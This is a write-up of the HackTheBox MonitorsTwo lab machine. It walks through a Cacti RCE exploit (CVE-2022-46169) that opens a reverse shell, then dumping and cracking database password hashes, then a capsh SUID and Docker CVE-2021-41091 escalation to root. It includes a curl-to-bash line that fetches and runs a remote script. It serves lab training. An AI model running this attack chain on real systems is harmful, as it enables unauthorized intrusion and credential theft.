---
title: HackTheBox MonitorsTwo Write-up
author: cr0mll
date: 2023-09-04
categories: [HackTheBox, Machines]
tags: [hackthebox, monitorstwo, machines, easy]
---

# Introduction

[MonitorsTwo](https://app.hackthebox.com/machines/MonitorsTwo) was an easy-rated machine which involved exploiting two CVEs - one in [Cacti](http://www.cacti.net/) in order to get user and then one in docker engine in order to get root.

![MonitorsTwo](/assets/img/htb/machines/MonitorsTwo/MonitorsTwo.png)

## Initial Reconnaissance

I initially scan the machine to reveal all open TCP ports:

```bash
nmap -p- 10.10.11.211
```

![Initial Scan](/assets/img/htb/machines/MonitorsTwo/Initial%20Scan.png)

Afterwards, I enumerate the open ports for version and service information:

```bash
nmap -p22,80 -sC -sV 10.10.11.211
```

![Full TCP Scan](/assets/img/htb/machines/MonitorsTwo/Full%20TCP%20Scan.png)

## Foothold

### Website on port 80

Visiting [http://10.10.11.211](http://10.10.11.211) in the browser gives the following webpage:

![Website on port 80](/assets/img/htb/machines/MonitorsTwo/Website%20on%20port%2080.png)

Googling `Cacti version 1.2.22` immediately presents us with an [RCE Exploit](https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22). Clone the repository with the proof-of-concept exploit:

```bash
git clone https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22
```

Change directory into the cloned repository, set up a netcat listener and run the exploit:

```bash
python CVE-2022-46169.py -u http://10.10.11.211 --LHOST=<your ip> --LPORT=<listening port>
```

![CVE-2022-46169](/assets/img/htb/machines/MonitorsTwo/CVE-2022-46169%20Success.png)

![www-data shell](/assets/img/htb/machines/MonitorsTwo/www-data%20shell.png)

We obtain a shell as `www-data`. Weirdly, it appears that python is not installed, so we will use `script` to upgrade our shell:

```bash
SHELL=/bin/bash script -q /dev/null
Ctrl+Z
stty raw -echo
fg
Enter
Enter
```

![www-data Shell Upgrade](/assets/img/htb/machines/MonitorsTwo/www-data%20Shell%20Upgrade.png)

Now we have tab autocompletion and can use the arrow-keys for navigation.

## User Flag

Our `www-data` shell lands us in `/var/www/html` where we find the Cacti application. Cacti stores its configuration in `include/config.php` where we find database credentials.

![Cacti database credentials](/assets/img/htb/machines/MonitorsTwo/Cacti%20database%20credentials.png)

We can connect to the database with

```bash
mysql -h db -u root -proot cacti
```

Running `show tables;` reveals a long-winded list of tables, but the table which sounds most enticing to me is `user_auth`. Let's see what is inside it:

```sql
select * from user_auth;
```

![user_auth table](/assets/img/htb/machines/MonitorsTwo/user_auth%20table.png)

Jackpot! We find three potential users and their password hashes. My intuition tells me to start with `marcus`, so copy his hash and crack it via hashcat. This seems like a bcrypt hash, so we will use mode `3200`.

```bash
hashcat -a 0 -m 3200 hashes/MonitorsTwo.hash rockyou.txt -O
```

![Marcus Hash Cracked](/assets/img/htb/machines/MonitorsTwo/Marcus%20hash%20cracked.png)

We get the credentials `marcus:funkymonkey`. Let's see if we can SSH into the box with them. 

```bash
ssh marcus@10.10.11.211
```

![Marcus SSH](/assets/img/htb/machines/MonitorsTwo/Marcus%20SSH.png)

Indeed we can!

## Root Flag

The first thing to do is to check whether we can run anything as `sudo`:

```bash
sudo -l
```

![sudo -l](/assets/img/htb/machines/MonitorsTwo/sudo%20-l.png)

Apparently not. Alright then, the next step is to run [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS). Download the script from the [releases](https://github.com/carlospolop/PEASS-ng/releases/tag/20230724-deeec83e) on your box and transfer it to the MonitorsTwo machine via `scp`:

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/download/20230724-deeec83e/linpeas.sh
scp linpeas.sh marcus@10.10.11.211:/tmp/
```

LinPEAS reveals that we have unread mail...

![LinPEAS mail](/assets/img/htb/machines/MonitorsTwo/Linpeas%20mail.png)

Let's see what we have.

```bash
cat /var/mail/marcus
```

![Marcus mail](/assets/img/htb/machines/MonitorsTwo/Marcus mail.png)

The email informs us of some "recently discovered" vulnerabilities and tells us how to mitigate them. The third one, `CVE-2021-41091`, seems to be the only interesting one because it mentions permissions. Let's check if docker is installed and if its version might be vulnerable.

![docker version](/assets/img/htb/machines/MonitorsTwo/docker%20version.png)

Indeed, we do have docker installed and it seems to be vulnerable. Googling the CVE, we find this [proof-of-concept](https://github.com/UncleJ4ck/CVE-2021-41091), although it seems that it requires a docker container. Let's check if we have any containers running:

```bash
ps aux | grep docker
```

![List Containers](/assets/img/htb/machines/MonitorsTwo/list%20containers.png)

It appears that the  Cacti application on port 80 might actually be running in a docker container. This actually makes a lot of sense, since if you recall, `python` was not installed when we tried to upgrade our shell. So, exploit the foothold POC to gain a shell as `www-data` again. We need to sneak in LinPEAS into the container, but SSH won't do the trick, since it is not installed. Nevertheless, `curl` does seem to be a part of the container, so we can setup a python server on our machine and have the container download LinPEAS from there.

```bash
python -m http.server 80
```

```bash
curl http://<your ip>/linpeas.sh | bash
```

Linpeas confirms that this is a container.

![Container confirmed](/assets/img/htb/machines/MonitorsTwo/Container%20confirmed.png)

Alright, let's see how to exploit [CVE-2021-41091](https://github.com/UncleJ4ck/CVE-2021-41091).

![CVE-2021-41091 guide](/assets/img/htb/machines/MonitorsTwo/CVE-2021-41091%20guide.png)

The exploit requires root access within the container, so let's check LinPEAS again for any possible escalation paths. Looking at the [SUID](https://cr0mll.github.io/cyberclopaedia/System%20Internals/Linux/File System.html#set-owner-user-id-suid) binaries, we see `capsh`. It is even highlighted by LinPEAS as an almost certain privilege escalation vector.

![capsh suid](/assets/img/htb/machines/MonitorsTwo/capsh%20suid.png)

Looking up the binary on [GTFOBins](https://gtfobins.github.io/gtfobins/capsh/#suid) reveals that we can use the following command to obtain root access to the container.

```bash
capsh --gid=0 --uid=0 --
```

Now, the CVE requires us to set the SUID bit on `/bin/bash` inside the container, so let's do that.

```bash
chmod u+s /bin/bash
```

![Bash suid](/assets/img/htb/machines/MonitorsTwo/bash%20suid.png)

Clone the PoC script to your host and transfer it on the main machine via scp. Switch to your SSH session and execute the script.

![Root shell](/assets/img/htb/machines/MonitorsTwo/Root%20Shell.png)

If no shell was spawned, as was the case here, then you need to change into the directory generated by the exploit and execute `/bin/bash -p`.